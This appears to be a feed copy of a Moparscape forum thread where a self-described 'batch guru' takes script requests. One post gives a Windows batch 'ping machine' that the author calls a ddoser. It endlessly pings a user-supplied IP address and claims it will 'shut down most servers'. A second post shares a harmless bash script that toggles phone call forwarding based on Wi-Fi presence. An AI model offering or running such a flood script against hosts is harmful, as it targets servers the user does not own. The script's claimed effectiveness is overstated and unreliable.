channel.title: Any Batch Requests?
channel.description:
Since so many people are asking around for batch things , i figured i would make a thread for it. I am a batch guru, able to code quite alot in batch Plz post your requests for a batch code and i will reply.
Don't ask for the impossible for example making a rs [b]CHEAT[/b] client out of batch. but ask if u would like s batch that [b]OPENS[/b] rs directly from the desktop.
i will gladly help with any batch and if anyone has any coding projects that they would like help with, then pm me or post on this thread about it and i will see what i can do.
Post batch challenges as well but i prefer making the code for tools not challenges

item.title: Any Batch Requests?
item.dc:creator: @Wolf_Dog_99 Wolf Dog 99
item.description:
@Wolf_Dog_99 wrote:

Sorry Guys i havent been on for a while

@Mopar idk the language u did ur script in, i use windows not linux or mac (it’s shit ik)

@Matty i forgot about ur ddoser, acording to what anthony said, than the following code should work.

@echo off title Wolf Dog 99's Ping Machine echo Hello, and welcome to Wolf DOg 99's ping machine echo This should shut down most servers unless they are on a vps echo . echo please type the ip address of the machine below set /p c=Ip address? msg %username% now pinging, close the box to exit. msg %username% Credits go to Wolf Dog 99 of Moparscape forums. pause goto Pinger :Pinger ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% ping %c% goto Pinger rem ||||||||||||||||||||||||||||||||||||||||||||||| rem - _ rem - Made by Wolf Dog 99 of Moparscape forums _ rem - _ rem - _ rem - _ rem - _ rem - _ rem - _ rem - _ rem -|||||||||||||||||||||||||||||||||||||||||||||-

So u just have to put that in notepad and save it as “something”.bat
without quotes and run it.

Read full topic

item.title: Any Batch Requests?
item.dc:creator: @moparisthebest Moparisthebest
item.description:
@moparisthebest wrote:

Rewrite this in ‘Batch’:

[code=bash]#!/bin/bash

GV_USER=gv_user@gmail.com
GV_PASS=gv_pass

forward to cell num

PHONE_OFF_COMMAND=“java -jar /sbin/gv_forward.jar $GV_USER $GV_PASS +12223334444”

forward to house num

PHONE_ON_COMMAND=“java -jar /sbin/gv_forward.jar $GV_USER $GV_PASS +12223334444”

PHONE_MAC=00:11:22:33:44:55

if [ -f /tmp/phone_check.lock ]
then
exit;
fi
touch /tmp/phone_check.lock;

I check wl0 and wl1 because my router has 2 antennas, you can just check one for most routers

RESULTS=$(ssh root@urltodd-wrtrouter.com “wl -i $(nvram get wl0_ifname) assoclist; wl -i $(nvram get wl1_ifname) assoclist” | grep $PHONE_MAC)

if [ “$RESULTS” = “” ]
then
echo “phone off network”
# if the phone was on last time, lets turn it off
if [ -f /tmp/phone_on ]
then
rm /tmp/phone_on
touch /tmp/phone_off
$PHONE_OFF_COMMAND
fi
else
echo “phone on network”
# if the phone was off last time, lets turn it on
if [ -f /tmp/phone_off ]
then
rm /tmp/phone_off
touch /tmp/phone_on
$PHONE_ON_COMMAND
fi
fi

rm /tmp/phone_check.lock;[/code]

So that it can be ran in windows without using cygwin, it should be pretty easy to do, especially for such a whiz.

Or, even better, write a batch script to convert a bash script into batch!!!

Read full topic
